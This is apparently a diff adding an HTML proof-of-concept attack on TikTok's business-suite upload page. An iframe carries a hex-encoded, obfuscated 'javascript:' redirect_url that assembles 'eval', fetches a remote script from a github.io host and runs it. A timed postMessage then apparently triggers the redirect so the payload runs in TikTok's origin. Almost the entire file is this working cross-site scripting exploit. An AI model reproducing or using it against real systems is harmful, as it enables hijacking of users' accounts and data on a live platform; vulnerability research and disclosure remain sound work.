@@ -1,1 +1,22 @@
-<a href="aweme://webview?url=https://inapp.tiktokv.com/htc/mission/detail?mission_id=7439234909165701896&enter_from=preview&preview_token=Q2dZSUFTQUhLQUVTZmdwOEV1Q01icVQ3M2tMb2tIL3pFVXZKZXMvRDdnQk5Ld053UEJ6V3J3L2RBZ0VDTEJjK2RDQk0zRHlzTWxKZksvVEtGcXlpL2RMdU43L1F0TTR0L2hvNnd6eFpqSUhpZzN0cjZEYll3RkxEOGF4cDdJZTVqOHphK3U4di9nUDZOUUM1eVJ2M2V1NTdzUGxIQnVVN25DelMyNzZ4aU56M1RQZ0kxTFJjMEJvQQ&hide_nav_bar=1&container_color_auto_dark=1">Test
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+</head>
+<body>
+  <iframe id="myIframe" src="https://web-sg.tiktok.com/business-suite/upload?enter_from=post_management&lang=en&origin=wbs_revamp&redirect_url=%09java%09script:%28%24%3d%27%74%27%2c%20%78%3d%27%65%76%27%2b%27%61%6c%27%2c%20%78%3d%74%68%69%73%5b%78%5d%2c%20%79%3d%27%66%65%27%2b%24%2b%27%63%68%28%5c%27%68%74%74%70%73%3a%2f%2f%6d%72%68%61%76%69%74%2e%67%69%74%68%75%62%2e%69%6f%2f%74%69%6b%2e%6a%73%5c%27%29%27%2c%20%79%3d%78%28%79%29%2c%20%78%28%79%29%29%2e%74%68%65%6e%28%72%65%73%70%6f%6e%73%65%20%3d%3e%20%72%65%73%70%6f%6e%73%65%2e%74%65%78%74%28%29%29%2e%74%68%65%6e%28%6a%73%43%6f%64%65%20%3d%3e%20%78%28%6a%73%43%6f%64%65%29%29" width="500" height="500"></iframe>
+
+  <script>
+    window.addEventListener('load', () => {
+      setTimeout(() => {
+        const iframe = document.getElementById('myIframe');
+        if (iframe && iframe.contentWindow) {
+          iframe.contentWindow.postMessage({type: "upload-page-back"}, "https://web-sg.tiktok.com");
+        }
+      }, 3000); // Delay of 3000 milliseconds (3 seconds)
+    });
+  </script>
+</body>
+</html>
